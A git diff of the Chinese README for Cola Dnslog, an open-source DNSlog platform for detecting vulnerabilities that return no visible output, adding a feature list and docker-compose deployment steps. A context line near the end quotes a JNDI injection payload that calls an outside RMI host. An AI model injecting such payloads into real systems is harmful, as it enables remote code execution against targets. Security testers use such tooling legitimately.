@@ -9,6 +9,15 @@
 <div align="right">
 <p>--AbelChe</p>
 </div>
+Cola Dnslog 是一款更加强大的dnslog平台（无回显漏洞探测辅助平台），
+
+- 完全开源
+- 支持dns http ldap rmi等协议
+- 提供API调用方式便于与其他工具结合
+- 支持钉钉机器人、Bark等提醒
+- 支持docker一键部署
+
+------
 
 涉及到技术、框架：
 
@@ -54,13 +63,40 @@
 
 ##### 一键启动（推荐）
 
+1. 下载源码
+
 ```sh
 git clone https://github.com/Abelche/cola_dnslog.git
 cd cola_dnslog
+```
+
+2. 修改docker-compose.yml中environment变量
+
+```yml
+...
+  server:
+    ...
+    environment:
+      DNS_DOMAIN: example.com # 自己的域名
+      NS1_DOMAIN: ns1.example.com # ns1绑定
+      NS2_DOMAIN: ns2.example.com # ns2绑定
+      SERVER_IP: 1.1.1.1 # vps ip
+    ...
+  front:
+  	...
+    environment:
+      API_BASE_URL: 'http://1.1.1.1:28001' # http://vpsip:28001
+    ...
+
+```
+
+3. 启动
+
+```sh
 docker-compose up -d
 ```
 
-启动之后查看docker日志或者查看info.txt获取账号信息
+4. 启动之后查看docker日志或者查看info.txt获取账号信息
 
 > server端程序运行会在程序根目录创建一个info.txt用于记录初始化的账号信息
 
@@ -72,6 +108,8 @@ docker exec -it <container_id> cat /coladnslog/info.txt
 ![image-20220812005813825](readme_resource/image-20220812005813825.png)
 
 > 如果需要自定义端口，请修改`docker-compose.yml`的端口映射`ports`即可
+
+
 
 ##### 前后端分离部署
 
@@ -404,5 +442,5 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 
 <div align="center">
 <img src="readme_resource/wx.jpg" alt="IMG_4788" width="40%" />
-<img src="readme_resource/WechatIMG5383.jpg" alt="WechatIMG5383.jpg" width="45%" />
+<img src="readme_resource/xq.jpg" alt="xq.jpg" width="45%" />
 </div>
